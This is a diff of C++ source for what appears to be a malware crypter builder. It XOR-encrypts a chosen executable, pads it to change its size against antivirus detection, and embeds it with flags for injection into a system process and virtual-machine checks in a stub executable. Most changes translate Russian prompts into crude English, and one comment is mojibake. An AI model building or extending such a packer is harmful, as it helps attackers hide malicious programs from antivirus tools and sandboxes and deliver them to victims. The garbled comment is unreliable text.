@@ -25,18 +25,17 @@ int main()
 {
 	setlocale(LC_ALL, "Russian");
 	string input_file, output_file;
-	cout << "Эта программа была создана @atyonekilla для публичного использования: \n";	
 	cout << "This program was create public using, please don`t delete author @atyonekilla: \n";	
-	Sleep(2000); system("cls");
+	Sleep(1000); system("cls");
 	//Main Functions
-	cout << "Введите имя входного файла: ";
+	cout << "input file(just drag the .exe to the CLI): ";
 	cin >> input_file;
-	cout << endl << "Введите имя выходного файла: ";
+	cout << endl << "out file name: ";
 	cin >> output_file;
 
 	CopyFile("Stub.exe", output_file.c_str(), FALSE);
-	// До этой строчки мы получили все необходимые данные для создаения стаба (остальное потом)
-	
+	// Г„Г® ГЅГІГ®Г© Г±ГІГ°Г®Г·ГЄГЁ Г¬Г» ГЇГ®Г«ГіГ·ГЁГ«ГЁ ГўГ±ГҐ Г­ГҐГ®ГЎГµГ®Г¤ГЁГ¬Г»ГҐ Г¤Г Г­Г­Г»ГҐ Г¤Г«Гї Г±Г®Г§Г¤Г ГҐГ­ГЁГї Г±ГІГ ГЎГ  (Г®Г±ГІГ Г«ГјГ­Г®ГҐ ГЇГ®ГІГ®Г¬)
+	//i still have no idea what this means
 	vector<unsigned char> file_bytes, settings;
 
 	HANDLE hFile = CreateFile(input_file.c_str(), GENERIC_ALL, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -47,12 +46,12 @@ int main()
 
 	if (file_size != bytes)
 	{
-		MessageBox(0, "Проблемы с файлом!", "", 0);
+		MessageBox(0, "something fucked up - file_size != bytes", "", 0);
 		return 0;
 	}
 
 	int pump_factor;
-	cout << "Накинуть вес (ввести 0 - если нет): ";
+	cout << "Increase file size(just adding 0s to the end of the file most of the anti viruses still detect pumping): ";
 	cin >> pump_factor;
 
 	for (int i = 0; i < pump_factor * 1000; ++i)
@@ -61,7 +60,7 @@ int main()
 	XORCrypt(key, file_bytes);
 
 	int bInject, bCheckVm;
-	cout << "Нужен ли инжект в системный процесс: ";
+	cout << "inject?(no idea wtf that means)(1=yes i think/0=no)";
 	cin >> bInject;
 
 	if (bInject == 1)
@@ -69,7 +68,7 @@ int main()
 	else
 		settings.push_back('0');
 	
-	cout << endl << "Нужна ли проверка на виртуальную машину: ";
+	cout << endl << "CHECK VM!!!(1=yes,0=no): ";
 	cin >> bCheckVm;
 
 	if (bCheckVm == 1)
@@ -81,6 +80,7 @@ int main()
 	WriteResources(output, 1, (BYTE*)settings.data(), settings.size());
 
 	WriteResources(output, 2, (BYTE*)file_bytes.data(), file_bytes.size());
-
+	
 	system("pause");
+	cout << "donezo";
 }
